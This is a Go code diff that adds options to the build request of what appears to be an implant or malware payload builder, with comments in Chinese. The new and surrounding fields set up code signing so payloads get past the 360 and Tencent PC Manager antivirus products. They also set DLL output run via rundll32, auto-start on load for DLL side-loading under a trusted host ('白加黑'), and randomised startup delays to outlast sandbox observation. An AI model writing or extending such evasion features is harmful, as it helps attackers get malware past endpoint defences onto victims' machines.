@@ -69,6 +69,10 @@ type BuildRequest struct {
 	// SignEnabled 构建后代码签名：证书在服务端配置（builder.sign_*），请求只能开启。
 	// 未签名的新 PE 在装有 360/电脑管家的主机上会被拒绝执行，签名是"能不能跑起来"的敲门砖。
 	SignEnabled bool `json:"sign_enabled"`
+	// DLLExport / DLLAutoStart 仅 format=dll 生效：导出函数名（rundll32 payload.dll,<名字>，
+	// 留空=Start）与"加载即启动"（白加黑场景宿主不一定调用我们的导出函数，默认 true）。
+	DLLExport    string `json:"dll_export"`
+	DLLAutoStart *bool  `json:"dll_autostart"`
 	// 启动随机延迟（秒）：留空(0)时用服务端配置 implant.startup_delay_min/max，
 	// 再回退 2~10s。显式传值可覆盖（如 20/60 拉长"启动即行为"的时间窗）。
 	StartupDelayMin int `json:"startup_delay_min"`
